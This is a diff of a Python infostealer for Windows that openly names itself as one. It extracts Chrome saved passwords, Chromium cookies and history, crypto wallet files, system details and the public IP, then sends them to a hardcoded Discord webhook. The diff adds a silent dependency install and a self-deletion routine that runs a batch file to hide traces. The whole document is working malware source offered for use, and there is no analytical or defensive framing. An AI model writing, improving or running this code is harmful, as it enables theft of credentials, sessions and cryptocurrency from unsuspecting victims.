@@ -1,24 +1,44 @@
-
 import os
 import sys
 import socket
+import subprocess
 import sqlite3
 import json
-import zipfile
 import shutil
 import platform
-import psutil
-import requests
+from pathlib import Path
 from urllib.request import urlopen, Request
 from urllib.error import URLError
 
 # --- Configuration ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1546874268149620806/GqZUiOIUuBrvSpPaEDskbdCt6yEijqlI82Ys1YtAjv818kkywiI9Pl6bCnUX5xPJ8vbp"
-ZIP_FILENAME = "steal_data.zip"
-ZIP_PATH = os.path.join(os.environ['TEMP'], ZIP_FILENAME)
+
+# --- Dependency Management ---
+def install_psutil():
+    """Installs psutil if not present."""
+    try:
+        import psutil
+        return True
+    except ImportError:
+        print("[!] psutil not found. Installing...")
+        try:
+            # Use subprocess to install psutil in the background
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "--quiet"])
+            print("[+] psutil installed successfully.")
+            return True
+        except Exception as e:
+            print(f"[!] Failed to install psutil: {e}")
+            return False
+
+# Try to install if needed
+if not install_psutil():
+    print("[!] Continuing without psutil. Some data might be missing.")
+    import psutil
+
+# --- Data Collection Functions ---
 
 def get_ip():
-    """Get public IP address"""
+    """Retrieves the public IP address."""
     try:
         ip = urlopen(Request('https://api.ipify.org', method='GET')).read().decode()
         return ip
@@ -33,7 +53,7 @@ def get_ip():
             return "Unknown"
 
 def get_system_info():
-    """Gather system information"""
+    """Gathers OS, hardware, and software info."""
     info = {
         "ip": get_ip(),
         "hostname": socket.gethostname(),
@@ -44,7 +64,7 @@ def get_system_info():
         "drives": []
     }
     
-    # Get installed software (Registry)
+    # Get installed software
     try:
         import winreg
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ)
@@ -67,13 +87,16 @@ def get_system_info():
         info["installed_software"].append(f"Error getting software: {e}")
 
     # Get drives
-    for drive in psutil.disk_partitions():
-        info["drives"].append(f"{drive.device} ({drive.mountpoint})")
+    try:
+        for drive in psutil.disk_partitions():
+            info["drives"].append(f"{drive.device} ({drive.mountpoint})")
+    except Exception as e:
+        info["drives"].append(f"Error getting drives: {e}")
 
     return info
 
 def get_chrome_passwords():
-    """Extracts Chrome passwords (Basic extraction, may require DPAPI for full decryption)"""
+    """Extracts Chrome passwords (raw data, decryption may require DPAPI)."""
     chrome_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
     login_data_path = os.path.join(chrome_path, "Login Data")
     
@@ -99,7 +122,7 @@ def get_chrome_passwords():
                 "password": password.decode('utf-8', errors='ignore') if isinstance(password, bytes) else password
             })
         conn.close()
-    except:
+    except Exception:
         pass
     finally:
         if os.path.exists(temp_login):
@@ -108,7 +131,7 @@ def get_chrome_passwords():
     return passwords
 
 def get_browsers():
-    """Gathers data from common browsers (Chrome, Edge)"""
+    """Gathers cookies and history from Chromium-based browsers."""
     data = {}
     browsers_to_check = [
         ("Google", "Chrome"),
@@ -159,7 +182,7 @@ def get_browsers():
     return data
 
 def get_wallets():
-    """Checks for common crypto wallet data files"""
+    """Checks for common crypto wallet files."""
     wallets = []
     wallet_paths = [
         "AppData\\Roaming\\Bitcoin\\wallet.dat",
@@ -180,133 +203,112 @@ def get_wallets():
             
     return wallets
 
-def create_zip():
-    """Zips collected data"""
-    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        info = get_system_info()
-        zipf.writestr("system_info.json", json.dumps(info, indent=4))
-        
-        browser_data = get_browsers()
-        if browser_data:
-            zipf.writestr("browser_data.json", json.dumps(browser_data, indent=4))
-            
-        passwords = get_chrome_passwords()
-        if passwords:
-            zipf.writestr("chrome_passwords.json", json.dumps(passwords, indent=4))
-            
-        wallets = get_wallets()
-        if wallets:
-            zipf.writestr("wallets_found.txt", "\n".join(wallets))
-            
-        for drive in psutil.disk_partitions():
-            zipf.writestr(f"drive_{drive.device.replace(':', '_')}_info.txt", 
-                          f"Mountpoint: {drive.mountpoint}\nFilesystem: {drive.fstype}\nSize: {drive.mountpoint}")
-
-def send_discord_embed(system_info, browser_data, passwords, wallets):
-    """Sends data to Discord via Webhook"""
-    embed_fields = []
+def format_message():
+    """Formats collected data into a Discord-friendly message."""
+    info = get_system_info()
+    browser_data = get_browsers()
+    passwords = get_chrome_passwords()
+    wallets = get_wallets()
     
-    # System Info
-    embed_fields.append({
-        "name": "System Info",
-        "value": f"**IP:** `{system_info['ip']}`\n**Hostname:** `{system_info['hostname']}`\n**OS:** `{system_info['os']}`\n**User:** `{system_info['user']}`\n**Arch:** `{system_info['architecture']}`"
-    })
+    messages = []
+    current_message = f"**System Info:**\n"
+    current_message += f"- **IP:** {info['ip']}\n"
+    current_message += f"- **Hostname:** {info['hostname']}\n"
+    current_message += f"- **OS:** {info['os']}\n"
+    current_message += f"- **User:** {info['user']}\n"
+    current_message += f"- **Architecture:** {info['architecture']}\n\n"
     
-    # Wallets
-    if wallets:
-        embed_fields.append({
-            "name": "Wallets Found",
-            "value": "\n".join(wallets)
-        })
-    else:
-        embed_fields.append({
-            "name": "Wallets",
-            "value": "None found"
-        })
-        
-    # Drives
-    embed_fields.append({
-        "name": "Drives",
-        "value": "\n".join(system_info['drives'])
-    })
-
-    # Browsers
-    if browser_data:
-        embed_fields.append({
-            "name": "Browsers",
-            "value": "Cookies and history collected (check ZIP file)"
-        })
-        
-    # Passwords
+    if info['installed_software']:
+        current_message += "**Installed Software:**\n"
+        for software in info['installed_software'][:10]:
+            current_message += f"- {software}\n"
+        if len(info['installed_software']) > 10:
+            current_message += f"... and {len(info['installed_software']) - 10} more\n"
+        current_message += "\n"
+    
+    if info['drives']:
+        current_message += "**Drives:**\n"
+        for drive in info['drives']:
+            current_message += f"- {drive}\n"
+        current_message += "\n"
+    
     if passwords:
-        embed_fields.append({
-            "name": "Passwords",
-            "value": f"{len(passwords)} passwords found (check ZIP file)"
-        })
-
-    # Prepare payload
-    payload = {
-        "embeds": [{
-            "title": f"Infostealer Report for {system_info['hostname']}",
-            "description": f"User: `{system_info['user']}`\nIP: `{system_info['ip']}`\nOS: `{system_info['os']}`",
-            "fields": embed_fields,
-            "color": 15158332, # Red color
-            "footer": {
-                "text": "Discord Stealer"
-            },
-            "timestamp": __import__('time').strftime('%Y-%m-%dT%H:%M:%S')
-        }]
-    }
+        current_message += "**Chrome Passwords:**\n"
+        for pwd in passwords[:10]:
+            current_message += f"- **URL:** {pwd['url']}\n"
+            current_message += f"  - **User:** {pwd['user']}\n"
+            current_message += f"  - **Pass:** {pwd['password']}\n\n"
+        if len(passwords) > 10:
+            current_message += f"... and {len(passwords) - 10} more\n\n"
     
-    # Send to webhook
-    try:
-        response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code == 204:
-            print("[+] Discord embed sent successfully")
-        else:
-            print(f"[-] Discord embed failed: {response.status_code} - {response.text}")
-    except Exception as e:
-        print(f"[-] Error sending to Discord: {e}")
+    if wallets:
+        current_message += "**Crypto Wallets Found:**\n"
+        for wallet in wallets:
+            current_message += f"- {wallet}\n"
+        current_message += "\n"
+    
+    if browser_data:
+        current_message += "**Browser Data:**\n"
+        for browser, data in browser_data.items():
+            current_message += f"- **{browser}:** {len(data)} entries\n"
+        current_message += "\n"
 
-def upload_zip_to_discord():
-    """Uploads the ZIP file to Discord"""
+    # Split into chunks if necessary
+    while len(current_message) > 2000:
+        split_index = current_message.rfind("\n", 0, 2000)
+        if split_index == -1:
+            split_index = 2000
+        messages.append(current_message[:split_index])
+        current_message = current_message[split_index:].lstrip("\n")
+    if current_message.strip():
+        messages.append(current_message)
+
+    return messages
+
+def send_to_discord(messages):
+    """Sends the messages to the Discord webhook."""
+    for msg in messages:
+        try:
+            payload = {
+                "content": msg
+            }
+            data = json.dumps(payload).encode('utf-8')
+            req = Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'}, method='POST')
+            response = urlopen(req)
+            return response.read()
+        except Exception as e:
+            return f"Error sending message: {e}"
+    return "No messages to send."
+
+def delete_self():
+    """Deletes the script file after a short delay."""
+    script_path = os.path.abspath(__file__)
+    batch_script = f"del \"{script_path}\" /f /q"
     try:
-        with open(ZIP_PATH, 'rb') as f:
-            files = {'file': (ZIP_FILENAME, f, 'application/zip')}
-            response = requests.post(WEBHOOK_URL, files=files)
-            if response.status_code == 200:
-                print("[+] ZIP file uploaded to Discord")
-            else:
-                print(f"[-] ZIP upload failed: {response.status_code} - {response.text}")
+        # Create a batch file to delete the script
+        with open(f"{script_path}.bat", "w") as f:
+            f.write(batch_script)
+        
+        # Run the batch file in the background
+        subprocess.Popen(f"cmd /c {script_path}.bat", shell=True)
+        # Remove the batch file immediately
+        os.remove(f"{script_path}.bat")
     except Exception as e:
-        print(f"[-] Error uploading ZIP: {e}")
+        print(f"[!] Failed to delete self: {e}")
 
 def main():
     print(f"[+] Infostealer running on {socket.gethostname()}")
     print(f"[+] Target IP: {get_ip()}")
     
-    # Create zip
-    create_zip()
-    print(f"[+] Data zipped to: {ZIP_PATH}")
+    # Format and send message
+    messages = format_message()
+    result = send_to_discord(messages)
+    print(f"[+] Result: {result}")
     
-    # Collect data for embed
-    system_info = get_system_info()
-    browser_data = get_browsers()
-    passwords = get_chrome_passwords()
-    wallets = get_wallets()
-    
-    # Send embed
-    send_discord_embed(system_info, browser_data, passwords, wallets)
-    
-    # Upload ZIP
-    upload_zip_to_discord()
-    
-    # Cleanup
-    try:
-        os.remove(ZIP_PATH)
-        print("[+] Cleanup complete. Zip deleted.")
-    except:
-        pass
+    # Delete self
+    print("[+] Deleting self...")
+    delete_self()
+    print("[+] Done.")
 
 if __name__ == "__main__":
     main()
